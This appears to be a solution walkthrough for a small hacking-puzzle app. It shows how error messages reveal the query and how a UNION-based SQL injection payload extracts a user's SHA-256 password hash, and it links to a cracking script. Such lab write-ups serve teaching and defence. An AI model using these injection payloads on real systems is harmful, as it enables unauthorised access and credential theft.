# Step 0

Add some user with a password to the database. Here we call them "Karl".

# Step 1

We check if quotation marks are escaped when adding user input to the query.

## Input
``` sql
'
```

[Click "Search for users"]

## Result

Error: unrecognized token: "'" in SELECT user FROM credentials WHERE user LIKE '%'%' at offset 49

## Interpretation

This input field is susceptible to SQL injection! And moreover, it kindly tells us the query used:

``` sql
SELECT user FROM credentials WHERE user LIKE '%{}%'
```

(The `{}` denotes the user input.)

# Step 2

Let's find out more about the database by also breaking the login request.

## Input
``` sql
'
```

[Click "Login"]

## Result

Error: unrecognized token: "'''" in SELECT password_hash FROM credentials WHERE user = ''' at offset 51

## Interpretation

The `credentials` table has a column called `password_hash`.

# Step 3

We know the names and types of the table and columns, it is time to extract the information we are looking for. Use the `UNION` command to append another query:

## Input
``` sql
' UNION SELECT password_hash FROM credentials '
```

[Click "Search for users"]

## Query after Injection
``` sql
SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT password_hash FROM credentials '%'
```

## Result

The following users match your query: ["03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4", "Karl"]

## Interpretation

This is the hashed password of Karl. From the length we can deduce that it is most probably a SHA-256 Hash. A small [Python script](https://github.com/TheComamba/TinyHackingPuzzle/blob/main/puzzle_soulution/02_crack_numeric_password.py) will be enouth to break it.
